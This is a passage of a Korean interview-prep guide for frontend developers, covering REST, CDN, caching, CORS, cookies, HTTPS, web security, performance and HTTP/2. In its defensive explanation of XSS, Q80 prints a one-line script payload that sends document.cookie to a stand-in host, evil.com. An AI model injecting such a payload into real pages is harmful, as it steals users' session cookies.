## Q75. REST API와 RESTful API를 설명할 수 있나요? 🔴

**💬 30초 답변**
> REST는 HTTP 기반으로 자원(resource)을 URL로 표현하고 HTTP 메서드로 조작하는 **아키텍처 스타일**입니다. RESTful API는 이 REST 원칙(자원 중심 URI, 메서드 의미 준수, 무상태 등)을 **잘 지켜 설계한 API**를 뜻합니다.

**📖 핵심 개념**

📌 **REST 핵심 원칙**
- **자원(Resource)**: URL은 자원을 명사로 표현 (`/users/1`)
- **행위(Verb)**: 동작은 HTTP 메서드로 (GET/POST/PUT/PATCH/DELETE)
- **표현(Representation)**: JSON 등으로 자원 상태 주고받음
- **무상태(Stateless)**: 각 요청은 독립적, 서버가 세션 상태 보관 안 함

```
❌ RESTful 하지 않음 (동사를 URL에)
GET  /getUser?id=1
POST /createUser
POST /deleteUser?id=1

✅ RESTful (자원 명사 + 메서드로 행위)
GET    /users/1      (조회)
POST   /users        (생성)
PATCH  /users/1      (수정)
DELETE /users/1      (삭제)
```

📌 **메서드 의미**

| 메서드 | 의미 | 멱등성 |
|--------|------|:---:|
| GET | 조회 | ✅ |
| POST | 생성 | ❌ |
| PUT | 전체 교체 | ✅ |
| PATCH | 부분 수정 | ❌ |
| DELETE | 삭제 | ✅ |

> 💡 "REST = 원칙/스타일, RESTful = 그 원칙을 잘 지킨 상태"로 구분. 엄격한 REST(HATEOAS까지)는 현실에서 드물고, 보통 "자원 중심 + 메서드 의미 준수 + 적절한 상태 코드"면 RESTful로 봅니다.

**🔥 예상 꼬리질문**
- Q. 멱등성(idempotent)이란? → A. 같은 요청을 여러 번 보내도 결과가 동일한 성질. GET/PUT/DELETE는 멱등, POST는 비멱등.
- Q. REST의 대안은? → A. GraphQL(필요한 필드만 질의, 오버페칭 방지), gRPC(고성능 RPC).

<details><summary>📝 한 줄 요약</summary>REST=자원(URL 명사)+행위(HTTP 메서드)+무상태 아키텍처 스타일. RESTful=그 원칙을 잘 지킨 API. 동사 URL은 안티패턴.</details>

## Q76. CDN은 무엇이며, 프런트엔드 앱 성능 개선에 어떻게 기여하나요? 🟡

**💬 30초 답변**
> CDN(Content Delivery Network)은 전 세계에 분산된 **엣지 서버**에 콘텐츠를 캐싱해, 사용자와 **물리적으로 가까운 서버**에서 정적 자원을 제공하는 네트워크입니다. 지연 시간(latency)을 줄이고 원본 서버 부하를 낮춰 로딩 성능을 높입니다.

**📖 핵심 개념**

```
CDN 없음:  서울 사용자 ───────────(먼 거리)──────────▶ 미국 원본 서버 (느림)
CDN 있음:  서울 사용자 ──▶ 서울 엣지 서버(캐시) ✅ (가까움, 빠름)
                              └ 캐시 없으면 원본에서 가져와 캐싱
```

📌 **성능 기여**
- **지연 감소**: 지리적으로 가까운 엣지에서 전송 → RTT↓
- **원본 부하 분산**: 정적 자원(JS/CSS/이미지/폰트)을 CDN이 대신 제공
- **고가용성**: 트래픽 폭주·장애 시 분산 처리
- **대역폭 절감**, 캐싱으로 반복 요청 최적화
- 부가: 압축(gzip/brotli), HTTP/2·3, 이미지 최적화 제공

🎯 **무엇을 올리나**: 이미지·폰트·JS/CSS 번들 등 **정적 자원**. 자주 안 바뀌는 자원에 효과적. (대표: Cloudflare, CloudFront, Fastly)

> 💡 캐싱(Q77)과 연결: CDN은 `Cache-Control`·파일 해시(`app.[hash].js`)로 캐시를 관리. 배포 시 파일명 해시가 바뀌어 자동으로 새 버전을 받게 함(cache busting).

**🔥 예상 꼬리질문**
- Q. 동적 콘텐츠도 CDN에? → A. 엣지 캐싱/엣지 함수로 일부 가능하나, 기본은 정적 자원이 핵심.
- Q. cache busting이란? → A. 파일명에 해시를 넣어 내용이 바뀌면 URL이 바뀌게 해 오래된 캐시를 무효화하는 기법.

<details><summary>📝 한 줄 요약</summary>전 세계 엣지 서버에 정적 자원을 캐싱해 가까운 곳에서 전달 → 지연↓·원본 부하↓·고가용성. 파일 해시로 cache busting.</details>

## Q77. 브라우저 캐싱 전략을 설명할 수 있나요? 🔴

**💬 30초 답변**
> 브라우저 캐싱은 한 번 받은 자원을 재사용해 네트워크 요청을 줄이는 것입니다. `Cache-Control`로 캐시 수명·정책을 정하고, 크게 **강한 캐시**(만료 전엔 서버에 안 물어봄)와 **재검증 캐시**(ETag/Last-Modified로 변경 여부만 확인)로 나뉩니다.

**📖 핵심 개념**

📌 **강한 캐시 (Strong Cache)** — 서버에 묻지 않음
```
Cache-Control: max-age=31536000, immutable   (1년, 안 바뀜)
```
- 만료 전엔 디스크/메모리 캐시에서 즉시 사용 (요청 0)
- 해시 파일명(`app.a1b2.js`)에 적합 — 내용 바뀌면 URL이 바뀌므로 길게 캐싱 가능

📌 **재검증 캐시 (Revalidation)** — 변경됐는지만 확인
```
Cache-Control: no-cache        (쓰기 전 매번 검증)
ETag: "abc123"                 (콘텐츠 지문)
→ 재요청 시 If-None-Match: "abc123"
→ 안 바뀌었으면 304 Not Modified (본문 없이 캐시 재사용)
```

📌 **주요 지시어**

| 지시어 | 의미 |
|--------|------|
| `max-age=N` | N초 동안 강한 캐시 |
| `no-cache` | 캐시하되 매번 재검증 |
| `no-store` | 캐시 금지(민감 정보) |
| `immutable` | 만료 전 재검증 안 함 |
| `private` / `public` | 개인 전용 / 공유(CDN) 가능 |

🎯 **실전 전략**: HTML은 `no-cache`(항상 최신 확인) + JS/CSS/이미지는 **해시 파일명 + `max-age` 길게**. 배포 시 HTML만 새로 받고, 바뀐 자원만 새 해시로 다운로드.

> 💡 ETag(콘텐츠 해시) vs Last-Modified(수정 시각) — 둘 다 재검증용. 304 응답은 본문을 안 보내 대역폭 절약.

**🔥 예상 꼬리질문**
- Q. 304 Not Modified란? → A. 재검증 결과 변경이 없을 때 서버가 본문 없이 보내는 응답 → 캐시 재사용.
- Q. 캐시했는데 새 버전 반영은? → A. 파일명 해시(cache busting)로 URL을 바꿔 새 자원을 받게 함.

<details><summary>📝 한 줄 요약</summary>강한 캐시(max-age, 서버에 안 물음)+재검증 캐시(ETag/304, 변경만 확인). HTML=no-cache, 정적 자원=해시 파일명+긴 max-age.</details>

## Q78. 서버리스 함수로 API 키와 같은 민감한 정보를 어떻게 관리할까요? 🟡

**💬 30초 답변**
> API 키는 클라이언트(브라우저) 코드에 두면 번들에 노출돼 탈취되므로, **서버리스 함수(또는 백엔드)를 중계 계층**으로 두고 키를 서버 환경변수에 보관합니다. 브라우저는 우리 서버리스 함수를 호출하고, 함수가 키를 붙여 외부 API를 대신 호출합니다.

**📖 핵심 개념**

```
❌ 위험: 브라우저가 키를 들고 직접 외부 API 호출
브라우저(API_KEY 노출!) ──▶ 외부 API

✅ 안전: 서버리스가 키를 숨기고 중계(프록시)
브라우저 ──▶ /api/proxy (서버리스) ──[ API_KEY ]──▶ 외부 API
              키는 서버 환경변수에만 존재
```

```js
// 서버리스 함수 (예: Next route handler / Vercel function)
export async function GET() {
  const res = await fetch("https://api.ext.com/data", {
    headers: { Authorization: `Bearer ${process.env.SECRET_KEY}` }, // 서버에만 존재
  });
  return Response.json(await res.json());
}
```

📌 **원칙**
- 비밀키는 **환경변수**(`.env`, 플랫폼 시크릿)에 저장, 절대 커밋 X (`.gitignore`)
- 클라이언트 노출용과 분리: Next는 `NEXT_PUBLIC_` 접두사만 노출(Q74), 나머지는 서버 전용
- 서버리스/BFF가 **프록시**로 키를 대신 사용 → 클라이언트엔 키가 안 감
- 필요 시 키 권한 최소화·도메인 제한·로테이션

> 💡 "프론트엔드에 들어가는 모든 값은 노출된다"가 대전제. 따라서 비밀은 항상 서버 경계 뒤에. 서버리스는 별도 서버 운영 없이 이 경계를 제공한다는 게 장점(Q73 API 루트와 같은 맥락).

**🔥 예상 꼬리질문**
- Q. `NEXT_PUBLIC_`에 키를 넣으면? → A. 클라이언트 번들에 박혀 노출 → 비밀키엔 절대 금지.
- Q. BFF(Backend For Frontend)란? → A. 프론트 전용 백엔드 계층. 키 관리·API 조합·응답 가공을 담당.

<details><summary>📝 한 줄 요약</summary>키는 클라에 두면 노출 → 서버리스/BFF를 프록시로 두고 서버 환경변수에 보관, 함수가 키 붙여 외부 호출. NEXT_PUBLIC_엔 비밀 금지.</details>

## Q79. CORS는 무엇인가요? 🔴

**💬 30초 답변**
> CORS(Cross-Origin Resource Sharing)는 **다른 출처(origin) 간 리소스 요청을 제어하는 브라우저 보안 정책**입니다. 브라우저는 기본적으로 동일 출처만 허용(SOP)하는데, 서버가 `Access-Control-Allow-Origin` 같은 응답 헤더로 허용을 명시하면 교차 출처 요청이 가능해집니다.

**📖 핵심 개념**

📌 **출처(Origin)** = 프로토콜 + 도메인 + 포트. 하나라도 다르면 cross-origin.
```
https://site.com        ←→  https://api.site.com   (도메인 다름 → cross)
http://site.com         ←→  https://site.com       (프로토콜 다름 → cross)
https://site.com:3000   ←→  https://site.com:4000  (포트 다름 → cross)
```

📌 **동작**: CORS는 **브라우저가** 막는 것(서버↔서버는 무관). 서버 응답 헤더로 허용을 선언해야 함.
```
Access-Control-Allow-Origin: https://site.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true   (쿠키 포함 시)
```

📌 **프리플라이트(Preflight)**: `PUT/DELETE`나 커스텀 헤더 등 "단순 요청"이 아니면, 브라우저가 본 요청 전에 **OPTIONS** 요청을 보내 서버 허용 여부를 미리 확인.

```
브라우저 ──OPTIONS(프리플라이트)──▶ 서버
        ◀──허용 헤더 응답──
        ──실제 요청(GET 등)──▶
```

> 💡 해결: **서버에서 CORS 헤더 설정**이 정석. 임시로는 개발 서버 **프록시**(Vite/Next rewrites)로 우회. "CORS 에러 = 클라 잘못"이 아니라 **서버가 허용 안 한 것**이 핵심.

**🔥 예상 꼬리질문**
- Q. CORS 에러를 프론트에서 해결? → A. 근본은 서버 헤더 설정. 개발 중엔 프록시로 우회 가능.
- Q. 왜 존재하나요? → A. 악성 사이트가 사용자의 인증 정보로 다른 도메인 API를 몰래 호출하는 것을 막기 위해(SOP 보완).

<details><summary>📝 한 줄 요약</summary>교차 출처 요청을 제어하는 브라우저 정책(SOP 보완). 서버가 Access-Control-Allow-* 헤더로 허용. 복잡 요청은 OPTIONS 프리플라이트. 해결은 서버 헤더/프록시.</details>

## Q80. 프런트엔드 영역에서 발생할 수 있는 보안 위협은? 🔴

**💬 30초 답변**
> 대표적으로 **XSS**(악성 스크립트 주입), **CSRF**(위조 요청), **클릭재킹**(iframe 함정), 민감 정보 노출 등이 있습니다. 특히 XSS와 CSRF가 프론트엔드 면접 핵심이며, 입력 검증·이스케이프·토큰·적절한 쿠키 설정으로 방어합니다.

**📖 핵심 개념**

📌 **① XSS (Cross-Site Scripting)** — 악성 스크립트 주입
```
공격: 게시글에 <script>fetch('evil.com?c='+document.cookie)</script> 삽입
→ 다른 사용자가 글을 보면 스크립트 실행 → 쿠키/토큰 탈취
```
- 방어: **출력 이스케이프**(`<`→`&lt;`, Q13/Q16), React는 JSX 자동 이스케이프(`dangerouslySetInnerHTML` 주의), **CSP** 헤더, `HttpOnly` 쿠키

📌 **② CSRF (Cross-Site Request Forgery)** — 위조 요청
```
로그인된 사용자가 악성 사이트 방문 → 사용자 쿠키로 은행 송금 요청 자동 전송
```
- 방어: **CSRF 토큰**, `SameSite=Lax/Strict` 쿠키, Referer 검증

📌 **③ 클릭재킹**: 투명 iframe으로 의도치 않은 클릭 유도 → `X-Frame-Options: DENY` / CSP `frame-ancestors`(Q11)

📌 **비교 (단골!)**

| | XSS | CSRF |
|---|-----|------|
| 본질 | 악성 **스크립트 실행** | 위조 **요청 전송** |
| 노리는 것 | 토큰/세션 탈취 | 사용자 권한 도용 |
| 방어 | 이스케이프·CSP·HttpOnly | CSRF 토큰·SameSite |

> 💡 XSS가 뚫리면 HttpOnly 쿠키 외 거의 모든 방어가 무력화됨 → "**입력은 믿지 말고, 출력은 이스케이프**"가 1원칙.

**🔥 예상 꼬리질문**
- Q. XSS와 CSRF 차이? → A. XSS는 스크립트를 실행시키는 것, CSRF는 인증된 사용자의 요청을 위조하는 것.
- Q. CSP란? → A. Content-Security-Policy. 실행 가능한 스크립트 출처를 화이트리스트로 제한해 XSS 영향 축소.

<details><summary>📝 한 줄 요약</summary>XSS(스크립트 주입→이스케이프·CSP·HttpOnly), CSRF(요청 위조→토큰·SameSite), 클릭재킹(X-Frame-Options). 입력 불신·출력 이스케이프.</details>

## Q81. 웹 보안에서 HTTPS가 왜 중요한지 설명할 수 있나요? 🔴

**💬 30초 답변**
> HTTPS는 HTTP에 **TLS 암호화**를 더한 것으로, 통신을 암호화해 도청·변조를 막고, 인증서로 서버 신원을 보장합니다. 중간자 공격(MITM) 방지, 데이터 무결성, 신뢰성을 제공하며 HTTP/2·서비스워커 등 최신 기능의 전제 조건이기도 합니다.

**📖 핵심 개념**

📌 **HTTPS가 보장하는 3가지**
- **기밀성(암호화)**: 중간에서 가로채도 내용을 못 봄 (비밀번호·카드번호 보호)
- **무결성**: 전송 중 데이터 변조 탐지
- **인증**: 인증서(CA 발급)로 "진짜 그 서버"임을 검증 → 피싱 방지

```
HTTP:  브라우저 ──평문──▶ 서버   (도청·변조 가능 ❌)
HTTPS: 브라우저 ──TLS 암호화──▶ 서버 (도청·변조 방지 ✅) + 인증서로 신원 확인
```

📌 **추가 이유**
- **SEO**: 검색엔진이 HTTPS를 가산점/기본 요건으로
- **최신 API 전제**: 서비스워커·PWA·Geolocation·HTTP/2 등은 HTTPS 필수
- 브라우저가 HTTP를 "주의 요함"으로 표시

> 💡 TLS 핸드셰이크: 비대칭키로 안전하게 대칭키를 교환한 뒤, 이후 통신은 빠른 대칭키로 암호화. 인증서는 Let's Encrypt 등으로 무료 발급 가능.

**🔥 예상 꼬리질문**
- Q. MITM 공격이란? → A. 중간자 공격. 통신 사이에 끼어 도청·변조. HTTPS 암호화·인증서로 방지.
- Q. HTTP와 차이 한 줄? → A. HTTP는 평문, HTTPS는 TLS로 암호화 + 서버 인증.

<details><summary>📝 한 줄 요약</summary>HTTP+TLS 암호화. 기밀성·무결성·인증(인증서)으로 도청·변조·MITM 방지. SEO·최신 API(PWA/HTTP2)의 전제.</details>

## Q82. Base64 인코딩이란 무엇인가요? 🟡

**💬 30초 답변**
> Base64는 **바이너리 데이터를 64개의 ASCII 문자로 변환**하는 인코딩 방식입니다. 텍스트만 안전하게 다루는 환경(JSON, 이메일, Data URL)에서 이미지 같은 이진 데이터를 문자열로 실어 보낼 때 사용합니다. 암호화가 아니라 **표현 방식 변환**일 뿐입니다.

**📖 핵심 개념**

```js
btoa("Hello");           // "SGVsbG8="  (인코딩)
atob("SGVsbG8=");        // "Hello"     (디코딩)

// Data URL: 이미지를 문자열로 인라인
<img src="data:image/png;base64,iVBORw0KGgo..." />
```

📌 **특징**
- A–Z, a–z, 0–9, `+`, `/` 64자 + 패딩 `=` 사용
- **크기 약 33% 증가** (3바이트 → 4문자)
- 암호화 ❌ (누구나 디코딩 가능 → 보안 수단 아님)

🎯 **언제 쓰나**
- 작은 이미지/아이콘을 Data URL로 인라인(HTTP 요청 절감, 단 캐싱 불리)
- JSON에 이진 데이터 포함
- JWT의 페이로드 인코딩(서명은 별도)
- 멀티모달 AI에 이미지 전송(Q105) 등

> ⚠️ Base64는 보안과 무관 — JWT 페이로드도 Base64라 **누구나 디코딩 가능**(그래서 민감정보 X, 서명으로 위조만 방지). 큰 이미지를 Base64로 인라인하면 33% 커지고 캐싱이 안 돼 오히려 손해.

**🔥 예상 꼬리질문**
- Q. Base64는 암호화인가요? → A. 아닙니다. 단순 표현 변환이라 쉽게 디코딩됨. 보안엔 부적합.
- Q. 언제 Data URL이 손해? → A. 큰 이미지 — 용량 33%↑, 별도 캐싱 불가, HTML 비대화. 작은 아이콘에만 유리.

<details><summary>📝 한 줄 요약</summary>바이너리를 64개 ASCII 문자로 변환(암호화 아님). JSON·Data URL·JWT에 이진 데이터 실을 때. 크기 33%↑, 디코딩 자유 → 보안 무관.</details>

## Q83. 세션 관리와 쿠키 기반의 보안 이슈를 설명할 수 있나요? 🔴

**💬 30초 답변**
> HTTP는 무상태라 로그인 상태를 유지하려면 세션이 필요합니다. 전통적으로 서버가 세션을 저장하고 **쿠키에 세션 ID**를 담아 식별합니다. 쿠키는 XSS로 탈취되거나 CSRF에 악용될 수 있어, `HttpOnly`·`Secure`·`SameSite` 속성으로 방어합니다.

**📖 핵심 개념**

📌 **세션 vs 토큰(JWT) 방식**

| | 세션(서버 저장) | 토큰(JWT, 클라 저장) |
|---|----------------|---------------------|
| 상태 | 서버가 세션 보관(stateful) | 서버 무상태(stateless) |
| 저장 | 쿠키에 세션 ID | 쿠키/스토리지에 토큰 |
| 확장성 | 서버 간 세션 공유 필요 | 확장 쉬움 |
| 무효화 | 즉시 가능 | 만료 전 어려움 |

📌 **쿠키 보안 속성 (면접 핵심!)**

| 속성 | 역할 |
|------|------|
| `HttpOnly` | JS 접근 차단 → **XSS로 쿠키 탈취 방지** |
| `Secure` | HTTPS에서만 전송 |
| `SameSite=Lax/Strict` | 교차 사이트 전송 제한 → **CSRF 방어** |
| `Domain`/`Path`/`Max-Age` | 범위·수명 |

```
Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Lax
```

> 💡 **토큰 저장 위치 논쟁**: localStorage(JS 접근 → XSS 취약) vs HttpOnly 쿠키(XSS엔 안전하나 CSRF 대비 SameSite 필요). 일반적으로 **HttpOnly + Secure + SameSite 쿠키**가 권장(Q9 연결).

**🔥 예상 꼬리질문**
- Q. HttpOnly가 막는 공격은? → A. XSS로 `document.cookie`를 읽어 토큰을 탈취하는 것.
- Q. SameSite가 막는 공격은? → A. CSRF — 교차 사이트 요청에 쿠키가 자동 첨부되는 것을 제한.

<details><summary>📝 한 줄 요약</summary>무상태 HTTP의 로그인 유지=세션/토큰. 쿠키에 식별자. 보안: HttpOnly(XSS)·Secure(HTTPS)·SameSite(CSRF). 토큰은 HttpOnly 쿠키 권장.</details>

## Q84. 서드 파티 스크립트의 성능과 보안 위험은? 🟡

**💬 30초 답변**
> 광고·분석·채팅 위젯 같은 서드파티 스크립트는 **추가 네트워크 요청과 메인 스레드 점유로 성능을 떨어뜨리고**, 외부 코드가 페이지를 조작할 수 있어 **보안·개인정보 위험**(공급망 공격, 데이터 유출)을 동반합니다.

**📖 핵심 개념**

📌 **성능 위험**
- 추가 요청·용량으로 로딩 지연, 렌더 블로킹
- 메인 스레드 점유 → 인터랙션 지연(코어 웹 바이탈 INP/LCP 악화 — Q99)
- 외부 서버 장애가 내 페이지에 전파

📌 **보안 위험**
- 외부 스크립트가 DOM·쿠키·입력에 접근 가능 → 데이터 유출, XSS 매개
- **공급망 공격(supply chain)**: 서드파티가 해킹되면 내 사이트에 악성코드 주입

📌 **완화책**

| 기법 | 효과 |
|------|------|
| `async`/`defer` | 렌더 블로킹 방지 |
| `<script>` 지연/조건부 로드 | 필요 시에만 |
| **SRI**(Subresource Integrity) | 해시로 변조된 스크립트 차단 |
| **CSP** | 허용 출처 제한 |
| iframe `sandbox` 격리 | 권한 제한 |

```html
<script src="https://cdn.x.com/lib.js"
        integrity="sha384-..." crossorigin="anonymous" defer></script>
```

> 💡 SRI는 CDN 스크립트의 해시를 검증해, 내용이 바뀌면(변조/해킹) 실행을 거부 → 공급망 공격 방어의 핵심.

**🔥 예상 꼬리질문**
- Q. SRI란? → A. Subresource Integrity. 리소스 해시를 명시해 변조 시 로드를 차단.
- Q. 서드파티 성능 측정은? → A. Lighthouse, `Performance` 패널로 3rd-party 영향(블로킹 시간) 확인.

<details><summary>📝 한 줄 요약</summary>외부 스크립트=성능(요청·메인스레드 점유)+보안(DOM/쿠키 접근, 공급망 공격) 위험. async/defer·SRI·CSP·sandbox로 완화.</details>

## Q85. 웹 사이트의 로딩 성능을 최적화하는 방법은? 🔴

**💬 30초 답변**
> 핵심은 **전송량 줄이기, 요청 줄이기, 우선순위 조정**입니다. 번들 최소화(코드 스플리팅·트리셰이킹), 이미지 최적화(WebP·lazy·반응형), 캐싱·CDN, 압축(gzip/brotli), 중요 자원 우선 로드(critical CSS, preload)로 코어 웹 바이탈을 개선합니다.

**📖 핵심 개념**

📌 **카테고리별 최적화**

**① 자원 크기 줄이기**
- JS: 코드 스플리팅(`import()`), 트리셰이킹, 압축(minify), gzip/brotli
- 이미지: WebP/AVIF, 반응형(srcset), 적절한 크기 — 보통 가장 큰 비중
- 폰트: `font-display: swap`, subset, preload
- CSS: 미사용 제거(purge), critical CSS 인라인

**② 요청 수·시점 최적화**
- lazy loading(이미지·컴포넌트), 무한스크롤
- preload/preconnect/dns-prefetch로 중요 자원 선행
- HTTP/2·3 멀티플렉싱(Q89)

**③ 캐싱·전송**
- 브라우저 캐싱(Q77) + CDN(Q76)
- 서버 렌더링(SSR/SSG)으로 빠른 FCP(Q66)

📌 **측정 → 개선 루프**: Lighthouse / WebPageTest로 측정 → LCP·CLS·INP(Q99) 병목 확인 → 개선. "측정 없는 최적화는 추측".

```
렌더 블로킹 제거: <script defer>, critical CSS 인라인
LCP 개선: 핵심 이미지 preload/priority, 서버 응답 단축
CLS 개선: 이미지·광고 영역 크기 예약
```

> 💡 면접 답변 구조: "**측정(Lighthouse) → 가장 큰 병목(보통 이미지·JS 번들)부터 → 크기/요청/우선순위 3축으로 개선**" 흐름으로 말하면 체계적으로 보임.

**🔥 예상 꼬리질문**
- Q. 가장 효과 큰 최적화는? → A. 보통 이미지(용량 비중 최다)와 JS 번들 축소. 측정 후 병목부터.
- Q. 렌더 블로킹 리소스란? → A. 파싱을 멈추게 하는 동기 CSS/JS. defer/async·critical CSS로 완화.

<details><summary>📝 한 줄 요약</summary>크기↓(스플리팅·트리셰이킹·이미지/폰트 최적화·압축)+요청 최적화(lazy·preload·HTTP2)+캐싱/CDN/SSR. Lighthouse 측정→병목부터 개선.</details>

## Q86. 마이크로 프런트엔드 아키텍처의 장단점은? 🟢

**💬 30초 답변**
> 마이크로 프론트엔드는 하나의 거대한 프론트엔드를 **독립적으로 개발·배포 가능한 작은 단위로 쪼개는** 아키텍처입니다. 팀별 독립성과 기술 자율성을 얻지만, 통합 복잡도·번들 중복·일관성 유지라는 비용이 따릅니다.

**📖 핵심 개념**

```
모놀리식 프론트          마이크로 프론트엔드
┌──────────────┐        ┌─────┬─────┬─────┐
│  하나의 큰 앱  │   →    │ 검색 │ 결제 │ 추천 │  (팀별 독립 배포)
└──────────────┘        └─────┴─────┴─────┘
                         쉘(컨테이너)이 조합
```

✅ **장점**
- **독립 배포**: 팀별로 따로 개발·배포 → 빠른 릴리스
- **기술 자율성**: 팀마다 다른 프레임워크/버전 가능
- **확장성**: 대규모 조직에서 병렬 작업, 장애 격리

❌ **단점**
- **통합 복잡도**: 라우팅·상태 공유·통신 어려움
- **번들 중복**: 공통 라이브러리(React 등) 중복 로드 → 성능 부담
- **일관성**: 디자인·UX 통일 어려움(디자인 시스템 필요)
- 운영·인프라 오버헤드

📌 **구현 방식**: Module Federation(Webpack), iframe, Web Components, 런타임/빌드타임 통합 등.

> 💡 면접 균형 답: "**대규모 조직·독립 배포가 중요할 때 유효하지만, 소규모엔 오버엔지니어링**. 번들 중복·일관성 비용을 디자인 시스템·공유 의존성으로 관리해야 함."

**🔥 예상 꼬리질문**
- Q. Module Federation이란? → A. Webpack5 기능. 런타임에 다른 앱의 모듈을 동적으로 불러와 공유.
- Q. 언제 도입하면 안 되나? → A. 소규모 팀·단일 제품 — 통합 비용이 이득을 초과.

<details><summary>📝 한 줄 요약</summary>프론트를 독립 배포 단위로 분할. 장점=팀 독립성·기술 자율·확장 / 단점=통합 복잡·번들 중복·일관성. 대규모 조직에 적합, 소규모엔 과함.</details>

## Q87. 웹 브라우저가 웹 사이트를 렌더링하는 과정을 네트워크 관점에서 설명할 수 있나요? 🟡

**💬 30초 답변**
> URL 입력부터 **DNS 조회 → TCP 연결 → TLS 핸드셰이크 → HTTP 요청/응답 → HTML 수신 → 파싱하며 하위 자원(CSS·JS·이미지) 추가 요청 → 렌더링** 순으로 진행됩니다. 네트워크 관점에서는 이 연결 수립과 자원 다운로드 과정이 핵심입니다.

**📖 핵심 개념**

```
1. URL 입력
2. DNS 조회      → 도메인을 IP로 변환 (캐시 활용)
3. TCP 연결      → 3-way handshake
4. TLS 핸드셰이크 → HTTPS 암호화 키 교환 (Q81)
5. HTTP 요청     → GET / 
6. HTTP 응답     → HTML 수신
7. HTML 파싱     → 그 안의 CSS/JS/이미지 발견 → 추가 요청 (2~6 반복)
8. 렌더링        → DOM/CSSOM → 렌더 트리 → 레이아웃 → 페인트 (Q93)
```

📌 **네트워크 관점 포인트**
- **DNS·연결 비용**: `dns-prefetch`, `preconnect`로 선행 단축
- **렌더 블로킹**: CSS는 렌더 블로킹, 동기 JS는 파싱 블로킹 → `defer`/`async`
- **자원 우선순위**: 중요한 것 먼저(`preload`), 나머지 지연(lazy)
- **요청 수**: HTTP/2 멀티플렉싱으로 동시 처리(Q89)

> 💡 "URL을 치면 무슨 일이?"의 단골 질문과 연결. 네트워크(DNS→TCP→TLS→HTTP)와 렌더링(파싱→렌더트리→페인트, Q93)을 이어서 설명하면 완성도 높음.

**🔥 예상 꼬리질문**
- Q. preconnect와 dns-prefetch 차이? → A. dns-prefetch는 DNS만, preconnect는 DNS+TCP+TLS까지 미리 수행.
- Q. CSS가 렌더 블로킹인 이유? → A. CSSOM이 완성돼야 렌더 트리를 만들 수 있어, 그 전엔 페인트를 미룸.

<details><summary>📝 한 줄 요약</summary>DNS→TCP→TLS→HTTP 요청/응답→HTML 파싱하며 하위 자원 추가 요청→렌더링. preconnect/preload·defer/async·HTTP2로 네트워크 단계 최적화.</details>

## Q88. 웹소켓은 어떤 경우에 사용하며, HTTP 폴링과 비교한 장단점은? 🔴

**💬 30초 답변**
> 웹소켓은 클라이언트와 서버 간 **양방향 실시간 통신**을 위한 프로토콜로, 한 번 연결하면 지속적으로 데이터를 주고받습니다. 채팅·실시간 알림·협업·주식 시세처럼 **서버가 능동적으로 데이터를 푸시**해야 할 때 폴링보다 효율적입니다.

**📖 핵심 개념**

📌 **방식 비교**

| 방식 | 동작 | 특징 |
|------|------|------|
| **폴링(Polling)** | 주기적으로 계속 요청 | 단순하나 불필요 요청 많음, 지연 |
| **롱 폴링** | 응답을 보류했다 데이터 생기면 응답 | 폴링보다 효율, 연결 반복 |
| **SSE** | 서버→클라 단방향 스트림 | 단방향 푸시(알림·피드)에 간단 |
| **웹소켓** | 지속적 양방향 연결 | 실시간 양방향, 오버헤드↓ |

```
폴링:   클라 ──요청?──▶ 서버  (데이터 없어도 반복) → 낭비
        클라 ──요청?──▶ 서버
웹소켓: 클라 ◀═══지속 연결═══▶ 서버  (양쪽 아무때나 전송) ✅
```

✅ **웹소켓 장점**: 실시간 양방향, 헤더 오버헤드 적음, 서버 푸시 가능
❌ **단점**: 연결 유지 비용, 스케일링 복잡(상태 유지), 일부 프록시/방화벽 이슈, 재연결 로직 필요(Q109)

🎯 **선택**: 단방향 알림/피드면 **SSE**(간단·HTTP 기반, Q107), 채팅·게임 등 양방향이면 **웹소켓**. 실시간성 불필요하면 그냥 폴링.

> 💡 웹소켓은 `ws://`/`wss://` 프로토콜. HTTP로 핸드셰이크 후 프로토콜 업그레이드(Upgrade 헤더)로 전환.

**🔥 예상 꼬리질문**
- Q. SSE와 웹소켓 차이? → A. SSE는 서버→클라 단방향(HTTP 기반·자동 재연결), 웹소켓은 양방향(별도 프로토콜).
- Q. 폴링을 언제 써도 되나? → A. 실시간성이 낮고 구현 단순함이 중요할 때(간헐적 상태 확인).

<details><summary>📝 한 줄 요약</summary>지속 양방향 실시간 통신(채팅·게임·시세). 폴링(반복 요청·낭비)·롱폴링·SSE(단방향)와 비교. 양방향=웹소켓, 단방향 푸시=SSE.</details>

## Q89. HTTP와 HTTP/2의 차이점은 무엇인가요? 🔴

**💬 30초 답변**
> HTTP/1.1은 연결당 요청을 **순차 처리**해 여러 자원을 받을 때 지연(HOL 블로킹)이 생깁니다. HTTP/2는 하나의 연결에서 **여러 요청을 동시에 처리(멀티플렉싱)** 하고, 헤더 압축·서버 푸시·바이너리 프레이밍으로 성능을 크게 개선했습니다.

**📖 핵심 개념**

📌 **비교**

| 항목 | HTTP/1.1 | HTTP/2 |
|------|----------|--------|
| 전송 | 텍스트 | **바이너리 프레이밍** |
| 요청 처리 | 순차(연결당 1개씩) | **멀티플렉싱**(한 연결 동시 다수) |
| HOL 블로킹 | 있음(앞 요청이 막힘) | 완화(앱 레벨) |
| 헤더 | 매번 반복 전송 | **HPACK 압축** |
| 서버 푸시 | ❌ | ✅ (현재는 비권장·폐기 추세) |

```
HTTP/1.1: 한 연결에서 ─req1─▶◀─res1─ ─req2─▶◀─res2─  (줄서기)
HTTP/2:   한 연결에서 req1,req2,req3 동시 전송/수신 (멀티플렉싱) ✅
```

📌 **과거 1.1 시절 꼼수 → 2에선 불필요**: 도메인 샤딩, 이미지 스프라이트, 파일 병합 등은 멀티플렉싱 덕에 오히려 역효과일 수 있음.

> 💡 **HTTP/3**: TCP 대신 **QUIC(UDP 기반)** 사용 → TCP의 HOL 블로킹까지 해결, 연결 수립이 빠르고 네트워크 전환(모바일)에 강함. "1.1→2(멀티플렉싱)→3(QUIC)" 흐름으로 기억.

**🔥 예상 꼬리질문**
- Q. HOL(Head-of-Line) 블로킹이란? → A. 앞선 요청이 막히면 뒤 요청도 대기하는 현상. HTTP/2는 앱 레벨에서, HTTP/3는 전송 레벨에서 해결.
- Q. HTTP/2에서 도메인 샤딩이 역효과인 이유? → A. 멀티플렉싱으로 한 연결에 다 처리 가능한데 연결을 쪼개면 오히려 비효율.

